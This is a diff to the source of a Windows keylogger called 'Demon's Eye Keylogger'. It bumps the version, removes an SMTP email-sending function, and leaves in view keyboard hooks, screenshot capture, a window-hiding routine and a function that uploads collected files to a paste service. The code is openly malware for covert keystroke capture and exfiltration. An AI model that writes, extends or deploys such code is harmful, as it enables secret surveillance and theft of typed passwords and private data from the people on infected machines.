@@ -50,12 +50,10 @@ import logging
 import mss
 import os
 import platform
-from smtplib import SMTP
 from pynput import keyboard
 import pythoncom
 import pyWinhook as pyHook
 import requests
-import smtplib
 import socket
 import sys
 import tempfile
@@ -71,7 +69,7 @@ import winreg
 # CONSTANTS
 ########################################################
 APPNAME = 'Demon\'s Eye Keylogger'      # Simply a name
-VERSION = '0.0.1'                       # Version
+VERSION = '0.0.2'                       # Version
 LOGGING_LEVEL = logging.DEBUG           # Log level. Can be -> DEBUG, INFO, WARNING, ERROR, CRITICAL
 LOG_FILENAME = 'DEKlogger.log'          # File name for the Log Level registered data (not keystrokes logging)
 CRLF = '\n'                             # Line Feed
@@ -408,31 +406,6 @@ def paste_file(file_name, service):
         logging.debug('URL of Paste {}'.format(url_file_pasted))
 
     return url_file_pasted
-
-
-# Mail info send --- Used only in debugging tasks. Not implemented in the keylogger
-def send_email(message):
-    if not config.SEND_EMAIL_ENABLED:
-        return
-
-    try:
-        # Configuration data
-        email_from_addr = config.SEND_EMAIL_FROM
-        email_to_addrs = config.SEND_EMAIL_DESTINATION_ADDRS
-        email_username = config.SEND_EMAIL_USERNAME
-        email_password = config.SEND_EMAIL_PASSWORD
-
-        # Sending mail
-        smtp_server = config.SEND_EMAIL_SMTP + ':' + config.SEND_EMAIL_PORT
-        server_mail: SMTP = smtplib.SMTP(smtp_server)
-        if config.SEND_EMAIL_TLS:
-            server_mail.starttls()
-        server_mail.login(email_username, email_password)
-        server_mail.sendmail(email_from_addr, email_to_addrs, message)
-    except Exception as ex:
-        logging.error('No he podido enviar mensaje. Excepcion : {}'.format(ex))
-    finally:
-        server_mail.quit()
 
 
 # Hide the application window
@@ -925,6 +898,3 @@ elif args.hookmodule == HOOK_PYNPUT:                    # pynput
     exit_demonseye()
 else:
     logging.error('Error en parametro hookmodule')      # this should not happen
-
-
-
